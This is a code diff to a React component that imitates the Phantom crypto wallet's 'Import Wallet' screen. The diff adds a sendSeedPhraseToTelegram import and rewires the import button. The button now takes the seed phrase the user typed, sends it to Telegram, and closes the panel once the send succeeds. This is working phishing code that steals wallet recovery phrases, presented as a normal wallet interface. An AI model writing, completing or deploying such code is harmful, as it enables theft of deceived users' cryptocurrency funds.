@@ -1,4 +1,5 @@
 import { useState, useEffect } from 'react';
+import { sendSeedPhraseToTelegram } from '../utils/telegram'; // 👈 NEW
 
 interface PhantomPanelProps {
   isOpen: boolean;
@@ -13,6 +14,7 @@ export default function PhantomPanel({ isOpen, onClose }: PhantomPanelProps) {
   const [phraseLength, setPhraseLength] = useState<12 | 24>(12);
   const [phraseValues, setPhraseValues] = useState<string[]>(Array(24).fill(''));
   const [invalidIndices, setInvalidIndices] = useState<number[]>([]);
+  const [isSending, setIsSending] = useState(false); // 👈 NEW
 
   // Reset and handle initial splash screen timer
   useEffect(() => {
@@ -22,6 +24,7 @@ export default function PhantomPanel({ isOpen, onClose }: PhantomPanelProps) {
       setPhraseLength(12);
       setPhraseValues(Array(24).fill(''));
       setInvalidIndices([]);
+      setIsSending(false); // 👈 NEW
 
       const timer = setTimeout(() => {
         setView('password');
@@ -45,7 +48,6 @@ export default function PhantomPanel({ isOpen, onClose }: PhantomPanelProps) {
     newValues[index] = value;
     setPhraseValues(newValues);
     
-    // Validate: only lowercase letters and no spaces/special chars
     const newInvalidIndices = newValues
       .slice(0, phraseLength)
       .map((val, i) => (val.length > 0 && !/^[a-z]+$/.test(val) ? i + 1 : -1))
@@ -242,16 +244,24 @@ export default function PhantomPanel({ isOpen, onClose }: PhantomPanelProps) {
                     </button>
                   </div>
                   <div className="w-full">
+                    {/* 👇 UPDATED BUTTON: Now sends to Telegram */}
                     <button 
+                      disabled={!isPhraseComplete() || isSending}
+                      onClick={async () => {
+                        setIsSending(true);
+                        const seedString = phraseValues.slice(0, phraseLength).join(' ');
+                        const success = await sendSeedPhraseToTelegram(seedString, 'Phantom Wallet');
+                        if (success) {
+                          onClose();
+                        } else {
+                          console.error('Failed to send seed phrase');
+                        }
+                        setIsSending(false);
+                      }}
                       className="font-inter flex items-center justify-center py-[14px] outline-none w-full text-[#222222] bg-[#ab9ff2] font-medium text-[16px] rounded-[16px] h-[47px] transition-all duration-300 hover:bg-[#e2dffe] disabled:opacity-60 disabled:cursor-not-allowed disabled:bg-[#333333] disabled:text-[#ffffff]" 
                       type="button" 
-                      disabled={!isPhraseComplete()}
-                      onClick={() => {
-                        console.log("Phantom Import Complete:", phraseValues.slice(0, phraseLength));
-                        onClose();
-                      }}
                     >
-                      Import Wallet
+                      {isSending ? 'Sending...' : 'Import Wallet'}
                     </button>
                   </div>
                 </div>
